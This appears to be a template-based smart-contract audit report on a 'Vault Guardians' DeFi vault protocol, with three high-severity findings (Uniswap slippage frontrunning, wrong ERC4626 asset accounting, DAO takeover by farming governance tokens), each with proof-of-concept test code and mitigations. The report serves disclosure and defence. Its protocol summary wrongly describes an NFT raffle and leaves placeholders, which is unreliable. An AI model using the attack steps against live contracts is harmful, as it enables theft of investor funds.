---
title: Protocol Audit Report
author: Cyfrin.io
date: March 7, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Protocol Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Cyfrin](https://cyfrin.io)
Lead Auditors: 
- xxxxxxx

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
- [Protocol Summary](#protocol-summary)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues Found](#issues-found)
  - [High](#high)
    - [\[H-1\] Lack of UniswapV2 slippage protection in `UniswapAdapter::_uniswapInvest` enables frontrunners to steal profits](#h-1-lack-of-uniswapv2-slippage-protection-in-uniswapadapter_uniswapinvest-enables-frontrunners-to-steal-profits)
    - [\[H-2\] `ERC4626::totalAssets` checks the balance of vault's underlying asset even when the asset is invested, resulting in incorrect values being returned](#h-2-erc4626totalassets-checks-the-balance-of-vaults-underlying-asset-even-when-the-asset-is-invested-resulting-in-incorrect-values-being-returned)
    - [\[H-3\] Guardians can infinitely mint `VaultGuardianToken`s and take over DAO, stealing DAO fees and maliciously setting parameters](#h-3-guardians-can-infinitely-mint-vaultguardiantokens-and-take-over-dao-stealing-dao-fees-and-maliciously-setting-parameters)

# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

**The findings described in this document correspond the following commit hash:**
```
XXXX
```

## Scope 

```
./src/
#-- abstract
|   #-- AStaticTokenData.sol
|   #-- AStaticUSDCData.sol
|   #-- AStaticWethData.sol
#-- dao
|   #-- VaultGuardianGovernor.sol
|   #-- VaultGuardianToken.sol
#-- interfaces
|   #-- IVaultData.sol
|   #-- IVaultGuardians.sol
|   #-- IVaultShares.sol
|   #-- InvestableUniverseAdapter.sol
#-- protocol
|   #-- VaultGuardians.sol
|   #-- VaultGuardiansBase.sol
|   #-- VaultShares.sol
|   #-- investableUniverseAdapters
|       #-- AaveAdapter.sol
|       #-- UniswapAdapter.sol
#-- vendor
    #-- DataTypes.sol
    #-- IPool.sol
    #-- IUniswapV2Factory.sol
    #-- IUniswapV2Router01.sol
```

# Protocol Summary 

Puppy Rafle is a protocol dedicated to raffling off puppy NFTs with variying rarities. A portion of entrance fees go to the winner, and a fee is taken by another address decided by the protocol owner. 

## Roles

There are 4 main roles associated with the system. 

- *Vault Guardian DAO*: The org that takes a cut of all profits, controled by the `VaultGuardianToken`. The DAO that controls a few variables of the protocol, including:
  - `s_guardianStakePrice`
  - `s_guardianAndDaoCut`
  - And takes a cut of the ERC20s made from the protocol
- *DAO Participants*: Holders of the `VaultGuardianToken` who vote and take profits on the protocol
- *Vault Guardians*: Strategists/hedge fund managers who have the ability to move assets in and out of the investible universe. They take a cut of revenue from the protocol. 
- *Investors*: The users of the protocol. They deposit assets to gain yeild from the investments of the Vault Guardians. 

# Executive Summary

The Vault Guardians project takes novel approaches to work ERC-4626 into a hedge fund of sorts, but makes some large mistakes on tracking balances and profits. 

## Issues Found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 0                      |
| Low      | 0                      |
| Info     | 0                      |
| Gas      | 0                      |
| Total    | 3                      |

## High

### [H-1] Lack of UniswapV2 slippage protection in `UniswapAdapter::_uniswapInvest` enables frontrunners to steal profits

**Description:** In `UniswapAdapter::_uniswapInvest` the protocol swaps half of an ERC20 token so that they can invest in both sides of a Uniswap pool. The `UnisapV2Router01` contract that calls `swapExactTokensForTokens`, and it has two input variables to note:

```javascript
    function swapExactTokensForTokens(
            uint256 amountIn,
@>          uint256 amountOutMin,
            address[] calldata path,
            address to,
@>          uint256 deadline
        )
```

It takes a `amountOutMin`, which represents how much of the minimum number of tokens it expects to return. 
It also takes `deadline`, which represents when the transaction should expire. 

The `UniswapAdapter::_uniswapInvest` sets those variables to `0` and `block.timestamp`:

```javascript
    uint256[] memory amounts = i_uniswapRouter.swapExactTokensForTokens(
        amountOfTokenToSwap, 
@>      0, 
        s_pathArray, 
        address(this), 
@>      block.timestamp
    );
```

**Impact:** This results in either of the following happening:
- A node sees this transaction in the mempool, pulls a flashloan and swaps on Uniswap to tank the price, resulting in the protocol executing a bad swap
- Due to the lack of a deadline, the node who gets this transaction could hold the transaction till they are able to profit from the gaurenteed swap

**Proof of Concept:**

1. User calls `VaultShares::deposit` with a vault that has a Uniswap allocation. 
   1. This calls `_uniswapInvest` for a user to invest into Uniswap, and calls `swapExactTokensForTokens`.
2. In the mempool, a malicious user could:
   1. Hold onto this transaction which makes the Uniswap swap
   2. Take a flashloan out
   3. Make a major swap on Uniswap, greatly changing the price of the assets
   4. Execute the transaction that was being held, giving the protocol as little funds back as possible due to the `0` `amountOutMin` value 

This could potentially allow malicious MEV users and frontrunners to drain balances. 

**Recommended Mitigation:** 

*For the deadline issue, we recommend the following:*

DeFi is a large landscape, for protocols that have sensitive investing parameters, add a custom parameter to the `deposit` function so the Vault Guardians protocol can account for the customizations of DeFi protocols.

In the deposit function, consider allowing for custom data. 

```diff
- function deposit(uint256 assets, address receiver) public override(ERC4626, IERC4626) isActive returns (uint256) {
+ function deposit(uint256 assets, address receiver, bytes customData) public override(ERC4626, IERC4626) isActive returns (uint256) {  
```

This way, you could add a `deadline` to the Uniswap swap, and also allow for more DeFi custom integrations. 

*For the `amountOutMin` issue, we recommend the one of the following:*

1. Do a price check on something like a [Chainlink price feed](https://docs.chain.link/data-feeds) before making the swap
2. Only deposit 1 side of a Uniswap pool for liquidity. Don't make the swap at all. If a pool doesn't exist or has too low liquidity for a pair of ERC20s, don't allow investment in that pool. 

This recommendation requires a significant change to the codebase. 

### [H-2] `ERC4626::totalAssets` checks the balance of vault's underlying asset even when the asset is invested, resulting in incorrect values being returned

**Description:** `ERC4626::totalAssets` checks the `balanceOf` the underlying asset for the vault. 

```javascript
function totalAssets() public view virtual returns (uint256) {
        return _asset.balanceOf(address(this));
    }
```

However, the assets are invested in the investible universe, ie Aave and Uniswap, which means this will never return the correct value. 

**Impact:** This breaks many functions of the `ERC4626` contract:
- `totalAssets`
- `convertToShares`
- `convertToAssets`
- `previewWithdraw`
- `withdraw`
- `deposit`

All calculations depend on the number of assets in the protocol, severly disrupting the protocol functionality.  

**Proof of Concept:**

<details>
<summary>Code</summary>

Add the following code to the `VaultSharesTest.t.sol` file. 

```javascript
function testWrongBalance() public {
        // Mint 100 ETH
        weth.mint(mintAmount, guardian);
        vm.startPrank(guardian);
        weth.approve(address(vaultGuardians), mintAmount);
        address wethVault = vaultGuardians.becomeGuardian(allocationData);
        wethVaultShares = VaultShares(wethVault);
        vm.stopPrank();

        // prints 3.75 ETH
        console.log(wethVaultShares.totalAssets());

        // Mint another 100 ETH
        weth.mint(mintAmount, user);
        vm.startPrank(user);
        weth.approve(address(wethVaultShares), mintAmount);
        wethVaultShares.deposit(mintAmount, user);
        vm.stopPrank();

        // prints 41.25 ETH
        console.log(wethVaultShares.totalAssets());
    }
```
</details>

**Recommended Mitigation:** Do not use the Openzeppelin implementation of `ERC4626` and instead natively keep track of users total amounts sentto each protocol. Potentially have an automation tool or incentive to keep track of profits and losses, and take snapshots of the investible universe. 

This would take a considerable re-write of the protocol. 

### [H-3] Guardians can infinitely mint `VaultGuardianToken`s and take over DAO, stealing DAO fees and maliciously setting parameters

**Description:** Becoming a guardian comes with the perk of getting minted `VaultGuardianToken`s. Whenever a guardian successfully calls `VaultGuardiansBase::becomeGuardian` or `VaultGuardiansBase::becomeTokenGuardian` they call `_becomeTokenGuardian` which mints them `i_vgToken`. 

```javascript
    function _becomeTokenGuardian(IERC20 token, VaultShares tokenVault) private returns (address) {
        s_guardians[msg.sender][token] = IVaultShares(address(tokenVault));
@>      i_vgToken.mint(msg.sender, s_guardianStakePrice);
        emit GuardianAdded(msg.sender, token);
        token.safeTransferFrom(msg.sender, address(this), s_guardianStakePrice);
        token.approve(address(tokenVault), s_guardianStakePrice);
        tokenVault.deposit(s_guardianStakePrice, msg.sender);
        return address(tokenVault);
    }
```

A user is also free to quit being a guardian at any time. The combination of minting vgTokens, and freely being able to quit results in users being able to farm `vgTokens` at any time. 

**Impact:** Assuming the token has no monetary value, the malicious guardian could overtake the DAO and call and pass any of the functions: 

```
  "sweepErc20s(address)": "942d0ff9",
  "transferOwnership(address)": "f2fde38b",
  "updateGuardianAndDaoCut(uint256)": "9e8f72a4",
  "updateGuardianStakePrice(uint256)": "d16fe105",
```

**Proof of Concept:**

1. User becomes WETH guardian, is minted VaultGuardianToken
2. User quits, is given back original WETH allocation
3. User becomes WETH guardian with the same initial allocation
4. Repeat, gets infinitely minted WETH

<details>
<summary>Code</summary>

Place the following code into `VaultGuardiansBaseTest.t.sol`

```javascript
    bytes[] functionCalls;
    address[] addressesToCall;
    uint256[] values;

    function testDaoTakeover() public hasGuardian hasTokenGuardian {
        address maliciousGuardian = makeAddr("maliciousGuardian");
        uint256 startingVoterUsdcBalance = usdc.balanceOf(maliciousGuardian);
        uint256 startingVoterWethBalance = weth.balanceOf(maliciousGuardian);
        assertEq(startingVoterUsdcBalance, 0);
        assertEq(startingVoterWethBalance, 0);

        // 0. Flash loan the tokens, or just buy a bunch for 1 block
        VaultGuardianGovernor governor = VaultGuardianGovernor(payable(vaultGuardians.owner()));
        VaultGuardianToken vgToken = VaultGuardianToken(address(governor.token()));

        // Malicious Guardian farms tokens
        weth.mint(mintAmount, maliciousGuardian); // The same amount as the other guardians
        uint256 startingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
        uint256 startingRegularVGTokenBalance = vgToken.balanceOf(guardian);
        console.log("Malicious VGToken Balance:", startingMaliciousVGTokenBalance);
        console.log("Regular VGToken Balance:", startingRegularVGTokenBalance);

        vm.startPrank(maliciousGuardian);
        for (uint256 i; i < 10; i++) {
            weth.approve(address(vaultGuardians), weth.balanceOf(maliciousGuardian));
            address maliciousWethSharesVault = vaultGuardians.becomeGuardian(allocationData);
            IERC20(maliciousWethSharesVault).approve(
                address(vaultGuardians), IERC20(maliciousWethSharesVault).balanceOf(maliciousGuardian)
            );
            vaultGuardians.quitGuardian();
        }
        vm.stopPrank();

        uint256 endingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
        uint256 endingRegularVGTokenBalance = vgToken.balanceOf(guardian);
        console.log("Malicious VGToken Balance:", endingMaliciousVGTokenBalance);
        console.log("Regular VGToken Balance:", endingRegularVGTokenBalance);
    }
```
</details>

**Recommended Mitigation:** There are a few options to fix this issue:

1. Mint `VaultGuardianToken`s on a vesting schedule after a user becomes a guardian
2. Burn `VaultGuardianToken`s when a user quits 

Or, simply do not allocate `VaultGuardianToken`s to guardians, and instead mint the total supply on contract deployment. 